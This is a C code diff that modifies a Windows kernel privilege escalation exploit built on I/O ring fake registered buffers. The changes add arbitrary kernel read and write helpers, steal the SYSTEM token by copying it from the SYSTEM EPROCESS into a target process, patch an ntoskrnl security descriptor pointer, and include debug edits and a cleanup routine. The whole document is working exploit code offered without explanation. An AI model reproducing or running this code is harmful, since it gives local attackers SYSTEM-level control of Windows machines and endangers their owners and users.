@@ -115,12 +115,15 @@ done:
     }
     return ret;
 }
-
+BOOL test = FALSE;
 int ioring_read(PULONG64 pRegisterBuffers, ULONG64 pReadAddr, PVOID pReadBuffer, ULONG ulReadLen)
 {
     int ret = -1;
+    SetFilePointer(hOutPipeClient, 0, NULL, FILE_BEGIN);
     PIOP_MC_BUFFER_ENTRY pMcBufferEntry = NULL;
+    FlushFileBuffers(hOutPipeClient);
     IORING_HANDLE_REF reqFile = IoRingHandleRefFromHandle(hOutPipeClient);
+    
     IORING_BUFFER_REF reqBuffer = IoRingBufferRefFromIndexAndOffset(0, 0);
     IORING_CQE cqe = { 0 };
 
@@ -129,6 +132,7 @@ int ioring_read(PULONG64 pRegisterBuffers, ULONG64 pReadAddr, PVOID pReadBuffer,
     if (NULL == pMcBufferEntry)
     {
         ret = GetLastError();
+        //ret = 0x13371337;
         goto done;
     }
 
@@ -139,12 +143,15 @@ int ioring_read(PULONG64 pRegisterBuffers, ULONG64 pReadAddr, PVOID pReadBuffer,
     pMcBufferEntry->AccessMode = 1;
     pMcBufferEntry->ReferenceCount = 1;
 
+    
     pRegisterBuffers[0] = pMcBufferEntry;
+    
 
     ret = BuildIoRingWriteFile(hIoRing, reqFile, reqBuffer, ulReadLen, 0, FILE_WRITE_FLAGS_NONE, NULL, IOSQE_FLAGS_NONE);
 
     if (0 != ret)
     {
+        //ret = 0x69;
         goto done;
     }
 
@@ -152,6 +159,7 @@ int ioring_read(PULONG64 pRegisterBuffers, ULONG64 pReadAddr, PVOID pReadBuffer,
 
     if (0 != ret)
     {
+        //ret = 0x6969;
         goto done;
     }
 
@@ -159,27 +167,34 @@ int ioring_read(PULONG64 pRegisterBuffers, ULONG64 pReadAddr, PVOID pReadBuffer,
 
     if (0 != ret)
     {
+        //ret = 0x696969;
         goto done;
     }
 
     if (0 != cqe.ResultCode)
     {
         ret = cqe.ResultCode;
+        //ret = 0x69696969;
         goto done;
     }
 
+    SetFilePointer(hOutPipe, 0, NULL, FILE_BEGIN);
     if (0 == ReadFile(hOutPipe, pReadBuffer, ulReadLen, NULL, NULL))
     {
         ret = GetLastError();
+        //ret = 0x1337;
+        
         goto done;
     }
+    FlushFileBuffers(hOutPipe);
 
     ret = 0;
 
 done:
     if (NULL != pMcBufferEntry)
     {
-        VirtualFree(pMcBufferEntry, sizeof(IOP_MC_BUFFER_ENTRY), MEM_RELEASE);
+        //VirtualFree(pMcBufferEntry, sizeof(IOP_MC_BUFFER_ENTRY), MEM_RELEASE);
+        VirtualFree(pMcBufferEntry, 0, MEM_RELEASE);
     }
     return ret;
 }
@@ -256,7 +271,8 @@ int ioring_write(PULONG64 pRegisterBuffers, ULONG64 pWriteAddr, PVOID pWriteBuff
 done:
     if (NULL != pMcBufferEntry)
     {
-        VirtualFree(pMcBufferEntry, sizeof(IOP_MC_BUFFER_ENTRY), MEM_RELEASE);
+        //VirtualFree(pMcBufferEntry, sizeof(IOP_MC_BUFFER_ENTRY), MEM_RELEASE);
+        VirtualFree(pMcBufferEntry, 0, MEM_RELEASE);
     }
     return ret;
 }
@@ -305,20 +321,49 @@ int race_succeeded(ULONG ulFakeRegBufferCnt, UINT64 ioring_addr)
 
 void kwrite(UINT64 addr, PVOID data, SIZE_T size) {
     ioring_write(0x65007500, &pIoRing->RegBuffersCount, data, size);
-
 }
 
+void krnl_write(UINT64 addr, PVOID data, SIZE_T size) {
+    ioring_write(0x65007500, addr, data, size);
+}
+
+int krnl_read(UINT64 addr, PVOID buffer, SIZE_T size) {
+    return ioring_read(0x65007500, addr, buffer, size);
+}
+
+UINT64 ulNtBase;
+void ioring_cleanup() {
+    if (!ulNtBase)
+        return;
+    UINT64 orig_val = ulNtBase + get_orig_sd_offset();
+    int ret = ioring_write(0x65007500, ulNtBase + get_sd_ptr_offset(), &orig_val, sizeof(orig_val));
+
+    char null[0x10] = { 0 };
+    ioring_write(0x65007500, &pIoRing->RegBuffersCount, &null, 0x10);
+}
+
+ULONG64 ullSysToken;
+ULONG64 systok2;
+ULONG64 get_sys_token() {
+
+    return ullSysToken;
+}
+
+ULONG64 get_systok2() {
+    return systok2;
+}
 
 int ioring_lpe2(ULONG pid, ULONG64 ullFakeRegBufferAddr, ULONG ulFakeRegBufferCnt, UINT64 ioring_addr, UINT64 nt_base)
 {
     int ret = -1;
     HANDLE hProc = NULL;
-    ULONG64 ullSystemEPROCaddr = 0;
+    ullSystemEPROCaddr = 0;
     ULONG64 ullTargEPROCaddr = 0;
     PVOID pFakeRegBuffers = NULL;
     _HIORING* phIoRing = NULL;
-    ULONG64 ullSysToken = 0;
-    char null[0x10] = { 0 };
+    ullSysToken = 0;
+    
+    ulNtBase = nt_base;
 
     hProc = OpenProcess(PROCESS_QUERY_INFORMATION, 0, pid);
 
@@ -359,12 +404,18 @@ int ioring_lpe2(ULONG pid, ULONG64 ullFakeRegBufferAddr, ULONG ulFakeRegBufferCn
     ioring_write(pFakeRegBuffers, (ioring_addr + 0x90), &zero_buf, 0x20);
 
     ret = ioring_read(pFakeRegBuffers, ullSystemEPROCaddr + EPROC_TOKEN_OFFSET, &ullSysToken, sizeof(ULONG64));
-
+    
+    
+    systok2 = 0;
+    ULONG64 toktest = 0;
+    ioring_read(pFakeRegBuffers, ullSystemEPROCaddr + EPROC_TOKEN_OFFSET, &systok2, sizeof(ULONG64));
+    
     if (0 != ret)
     {
         //wprintf(L"token read failed!\n");
         return 0;
     }
+    //systok2 = toktest;
 
     ret = ioring_write(pFakeRegBuffers, ullTargEPROCaddr + EPROC_TOKEN_OFFSET, &ullSysToken, sizeof(ULONG64));
 
@@ -373,9 +424,11 @@ int ioring_lpe2(ULONG pid, ULONG64 ullFakeRegBufferAddr, ULONG ulFakeRegBufferCn
         //  wprintf(L"token write failed\n");
     }
 
-    UINT64 orig_val = nt_base + get_orig_sd_offset();
-    ret = ioring_write(pFakeRegBuffers, nt_base + get_sd_ptr_offset(), &orig_val, sizeof(orig_val));
+    //UINT64 orig_val = ulNtBase + get_orig_sd_offset();
+    //ret = ioring_write(pFakeRegBuffers, ulNtBase + get_sd_ptr_offset(), &orig_val, sizeof(orig_val));
+    
 
-    ioring_write(pFakeRegBuffers, &pIoRing->RegBuffersCount, &null, 0x10);
+    //ioring_cleanup();
+    
 
 }
